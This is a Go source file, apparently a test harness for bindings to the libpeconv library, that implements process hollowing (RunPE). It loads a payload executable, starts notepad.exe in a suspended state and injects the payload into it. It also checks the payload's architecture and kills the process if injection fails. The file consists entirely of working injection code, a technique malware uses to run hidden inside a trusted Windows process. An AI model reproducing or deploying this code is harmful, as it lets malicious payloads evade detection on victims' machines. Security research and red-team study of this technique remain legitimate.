package main

import (
	"fmt"
	"log"
	"syscall"
)

//HollowProcess func
func HollowProcess() bool {
	payloadPath := `test.exe`
	targetPath := `C:\Windows\SysWOW64\notepad.exe`

	//1. Load the payload:
	//Test load_pe_module1
	var payloadImageSize uint64
	// Load the current executable from the file with the help of libpeconv:
	loadedPE := gLoadPEModule1(payloadPath, &payloadImageSize, false, false)
	fmt.Printf("Loaded_PE size in GO: %d\n", payloadImageSize)
	fmt.Printf("Loaded_PE ptr in GO: %X\n", loadedPE)

	if loadedPE == 0 {
		log.Println("Loading failed!")
		return false
	}

	//Test get_nt_hdr_architecture
	// Get the payload's architecture and check if it is compatibile with the loader:
	payloadArch := gGetNTHdrArch(loadedPE)
	fmt.Printf("Paylod_arch in GO: %#x\n", payloadArch)

	if payloadArch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payloadArch != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
		log.Println("Not supported payload architecture!")
		return false
	}

	//Test is64bit
	is32BitPayload := !gIs64Bit(loadedPE)
	fmt.Println("Is64Bit in GO: ", !is32BitPayload)

	// 2. Prepare the taget
	//Test is_target_compatible
	isTargComp := gIsTargetCompatible(loadedPE, payloadImageSize, targetPath)
	fmt.Println("Is Target Compatible in GO: ", isTargComp)

	if !isTargComp {
		gFreePEBuffer(loadedPE, payloadImageSize)
		return false
	}

	// Create the target process (suspended):
	//Test create_suspended_process
	var pi syscall.ProcessInformation
	isCreated := gCreateSuspendedProcess(targetPath, &pi)
	fmt.Printf("Suspended process created in GO: %t ProcessID: %d\n", isCreated, pi.ProcessId)

	if !isCreated {
		log.Println("Creating target process failed!")
		gFreePEBuffer(loadedPE, payloadImageSize)
		return false
	}

	//3. Perform the actual RunPE:
	//Test _run_pe
	isOK := gRunPE2(loadedPE, payloadImageSize, &pi, is32BitPayload)
	fmt.Println("Is injection successfull in GO: ", isOK)

	//4. Cleanup:
	if !isOK {
		//if injection failed, kill the process
		TerminateProcess(pi.ProcessId)
	}
	//Test free_pe_buffer
	isFree := gFreePEBuffer(loadedPE, payloadImageSize)
	fmt.Println("Is buffer free in GO: ", isFree)
	syscall.CloseHandle(pi.Thread)
	syscall.CloseHandle(pi.Process)
	//---
	return isOK
}
